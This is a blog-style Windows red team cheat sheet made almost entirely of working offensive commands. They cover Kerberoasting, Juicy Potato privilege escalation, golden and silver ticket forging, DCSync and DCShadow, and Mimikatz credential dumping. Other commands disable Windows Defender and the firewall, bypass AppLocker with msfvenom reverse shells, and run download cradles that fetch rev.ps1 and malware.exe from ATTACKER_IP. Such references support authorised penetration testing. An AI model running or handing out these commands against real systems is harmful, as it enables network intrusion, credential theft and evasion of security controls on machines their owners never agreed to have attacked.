
Windows Red Team Cheat Sheet
Posted on 2019-07-16
     Recon

    # Systeminfo
    systeminfo
    hostname
    # Especially good with hotfix info
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    # What users/localgroups are on the machine?
    net users
    net localgroups
    net user morph3
    # To see domain groups if we are in a domain
    net group /domain
    net group /domain
    # Network information
    ipconfig /all
    route print
    arp -A
    # To see what tokens we have
    whoami /priv
    # Recursive string scan
    findstr /spin "password" *.*
    # Running processes
    tasklist /SVC
    # Network connections
    netstat -ano
    # Search for writeable directories
    dir /a-r-d /s /b
    ### Some good one-liners
    # Obtain the path of the executable called by a Windows service (good for checking Unquoted Paths):
    sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul

Elevation of Privileges
     General

    # PowerShellMafia
    # Use always dev branch others are shit.
    https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
    powershell.exe -c "Import-Module C:\Users\Public\PowerUp.ps1; Invoke-AllChecks"
    powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"
    # Sherlock
    https://github.com/rasta-mouse/Sherlock
    # Unquoted paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

     Kerberoast

– For kerberos to work, times have to be within 5 minutes between attacker and victim.

    # Rubeus
    .\.rubeus.exe kerberoast /creduser:ecorp\morph3 /credpassword:pass1234
    # List available tickets
    setspn.exe -t evil.corp -q */*
    # List cached tickets
    Invoke-Mimikatz -Command '"kerberos::list"'
    powershell.exe -c "klist"
    powershell.exe -c "Import-Module C:\Users\Public\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"kerberos::list"'"
    # Request tickets
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
    # Requesting from outside
    python GetUserSPNs.py -request ECORP/morph3:supersecurepassword@127.0.0.1
    # Export tickets
    powershell.exe -c "Import-Module C:\Users\Public\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
    Invoke-Mimikatz -Command '"kerberos::list /export"'
    # Crack Tickets
    python tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi

     Juicy Potato

https://github.com/ohpe/juicy-potato/releases
Pick one CLSID from here according to your system
https://github.com/ohpe/juicy-potato/tree/master/CLSID

Required tokens
SeAssignPrimaryTokenPrivilege
SeImpersonatePrivilege

    C:\Windows\Temp\JuicyPotato.exe -p cmd.exe -a "/c whoami > C:\Users\Public\morph3.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}

      Stored Credential

    # To check if there is any stored keyscmdkey /list
    # Using them
    runas /user:administrator /savecred "cmd.exe /k whoami"

      Impersonating Tokens with meterpreter

    use incognito
    list_tokens -u
    impersonate_token NT-AUTHORITY\System

Lateral Movement

PsExec, SmbExec, WMIExec, RDP, PTH in general.
Since windows gave support to OpenSSH we should also consider SSH.
     Mimikatz Ticket PTH

    Enable-PSRemoting
    mimikatz.exe '" kerberos:ptt C:\Users\Public\ticketname.kirbi"' "exit"
    Enter-PSSession -ComputerName ECORP

     Winrm Session

    $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass)
    Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

     PTH with Mimikatz

    Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"'

     Database Links

    # PowerUpSQL
    https://github.com/NetSPI/PowerUpSQL
    Get-SQLServerLink -Instance server -Verbose
    powershell.exe -c "Import-Module C:\Users\Public\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\sql"
    # To see servers
    select srvname from master..sysservers;
    # Native
    Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"
    # Linked database tables
    select * from openquery("ECORP\FOO", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES')
    # You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler
    # With meterpreter module you can find linked databases and if you are admin on them
    # You can do a query and try to enable xp_cmpshell on that server
    select * from openquery("server",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure "xp_cmdshell",1;reconfigure;') AT "server"

Golden and Silver Tickets

Keys depend of ticket :
–> for a Golden, they are from the krbtgt account;
–> for a Silver, it comes from the “computer account” or “service account”.

    # Golden Ticket
    # Extract the hash of the krbtgt user
    lsadump::dcsync /domain:evil.corp /user:krbtgt
    lsadump::lsa /inject
    lsadump:::lsa /patch
    lsadump::trust /patch
    # creating the ticket
    # /rc4 or /krbtgt - the NTLM hash
    # /sid you will get this from krbtgt dump
    # /ticket parameter is optional but default is ticket.kirbi
    # /groups parameter is optional but default is 513,512,520,518,519
    # /id you can fake users and supply valid Administrator id
    kerberos::golden /user:morph3 /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519
    # After this , final ticket must be ready
    # Purge the currently cached kerberos ticket
    kerberos::purge
    kerberos::ptt golden.tck # you can also add /ptt at the kerberos::golden command
    # You can now verify that your ticket is in your cache
    powershell.exe -c "klist"
    # Verify that golden ticket is working
    dir \\DC\C$
    psexec.exe \\DC cmd.exe
    # Silver Ticket
    # Silver Ticket allows escalation of privileges on DC
    # /target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)
    # /service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)
    kerberos::golden /user:morph3 /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103
    sqlcmd -S evilcorp-sql102.evilcorp.local
    select SYSTEM_USER;
    GO
    kerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt

AD Attacks
     DC Shadow

DC Shadow attack aims to inject malicious Domain Controlllers into AD infrastructure so that we can dump actual AD members.

    #Find sid for that user
    wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
    #This will create a RPC Server and listen
    lsadump::dcshadow /object:"CN=morph3,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid
    # Run this from another mimikatz
    lsadump::dcshadow /push
    # After this unregistration must be done
    # Relogin
    lsadump::dcsync /domain:ECORP.local /account:krbtgt
    # Now you must have krbtgt hash
    https://attack.stealthbits.com/how-dcshadow-persistence-attack-works

     DC Sync

    #####
    lsadump::dcsync /domain:domain /all /csv
    lsadump::dcsync /user:krbtgt
    #####
    https://gist.github.com/monoxgas/9d238accd969550136db
    powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"
    #####
    python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
    python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL

Bypass-Evasion Techniques
     Powershell Constrained Language Bypass

    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')
    PSByPassCLM

     Windows Defender

    sc config WinDefend start= disabled
    sc stop WinDefend
    # Powershell
    Set-MpPreference -DisableRealtimeMonitoring $true
    # Remove definitions
    "%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

     Firewall

    Netsh Advfirewall show allprofiles
    NetSh Advfirewall set allprofiles state off

     Ip Whitelisting

    New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP

     Applocker ByPass

    https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
    https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
    https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
    # Multistep process to bypass applocker via MSBuild.exe:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i  > out.cs
    # Replace the buf-sc and save it as out.csproj
    https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
    Invoke-WebRequest "http://ATTACKER_IP/payload.csproj" -OutFile "out.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\out.csproj

     GreatSCT

    # This also needs Veil-Framework
    python GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe
    python3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll

     EvilSalsa

    #Preparing payloads
    python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
    EncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
    #Executing payload
    SalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP 9001
    # Reverse icmp shell
    python icmpsh_m.py "ATTACKER_IP" "VICTIM_IP"
    SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP

Miscellaneous
     Changing Permissions of a file

    icacls text.txt /grant Everyone:F

     Downloading files

    IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")
    (New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")
    Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"

     Adding user to Domain admins

    Add-DomainGroupMember -Identity 'Domain Admins' -Members morph3 -Verbose

      Base64 Decode

    certutil -decode foo.b64 foo.exe

      Network sharing

    # Local share
    net share
    wmic share get /format:list
    # Remote share
    net view
    net view \\dc.ecorp.foo /all
    wmic /node: dc.ecorp.foo share get
    # Mounting share
    net use Z: \\127.0.0.1\C$ /user:morph3 password123

      Port Forwarding

    # Port forward using plink
    plink.exe -l morph3 -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080
    # Port forward using meterpreter
    portfwd add -l attacker-port -p victim-port -r victim-ip
    portfwd add -l 3306 -p 3306 -r 192.168.1.56

      Powershell Portscan

    0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(VICTIM_IP,$_)) "Port $_ is open!"} 2>$null

      Recovering Powershell Secure String

    ######
    $user = "morph3"
    $file = "morph3-pass.xml"
    $cred= New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, (Get-Content $file | ConvertTo-SecureString)
    Invoke-Command -ComputerName ECORP -Credential $cred -Authentication credssp -ScriptBlock { whoami }
    ######
    [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR("string"))
    ######
    $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
    $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
    $result

      Injecting PowerShell scripts Into sessions

    Invoke-Command -FilePath scriptname -Sessions $sessions
    Enter-PSSession -Session $sess

      Enable RDP

    # CMD
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
    # Powershell
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    # Optional
    net localgroup "Remote Desktop Users" morph3 /add
    # Reruling firewall
    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
    netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow

      Decrypting EFS files with Mimikatz

Follow the link here How to Decrypt EFS Files

    privilege::debug
    token::elevate
    crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\thecert" /export
    dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id"
    # Clear text password
    dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\SID\masterkey" /password:pass123
    # After this command you must have the exported .der and .pvk files
    dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
    openssl x509 -inform DER -outform PEM -in blah.der -out public.pem
    openssl rsa -inform PVK -outform PEM -in blah.pvk -out private.pem
    openssl pkcs12 -in public.pem -inkey private.pem -password pass:randompass -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    # Import the certificate
    certutil -user -p randompass -importpfx cert.pfx NoChain,NoRoot
    type "C:\Users\Administrator\Documents\encrypted.txt"

Post exploitation - information gathering
      Reading Event Logs

User must be in “Event Log Reader” group
Follow this link

    Get-WinEvent -ListLog *
    # Listing logs of a specific user
    $cred = Get-Credentials
    Get -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred
    # Reading Security logs
    (Get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessNam
    e';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={
    $_.Properties[8].Value }}).commandline

      Password Dump

    # Metasploit
    post/windows/gather/enum_chrome
    post/multi/gather/firefox_creds
    post/firefox/gather/cookies
    post/firefox/gather/passwords
    post/windows/gather/forensics/browser_history
    post/windows/gather/enum_putty_saved_sessions
    # Empire
    collection/ChromeDump
    collection/FoxDump
    collection/netripper
    credentials/sessiongopher
    # mimikatz
    privilege::debug
    sekurlsa::logonpasswords

      NTDS.dit dump

    secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local
    python crackmapexec.py 192.168.1.56 -u morph3 -p pass1234 -d evilcorp.com --ntds drsuapi
    # on DC, lsass.exe can dump hashes
    lsadump::lsa /inject

Summary of tools
      Ad Environment

icebreaker
bloodhound
      Post Exploitation

Empire
DeathStar
CrackMapExec - CME
Covenant
Rubeus
SharpDPAPI
      ByPass

Ebowla
Veil-Framework
PsBypassCLM
      Swiss Knife

impacket
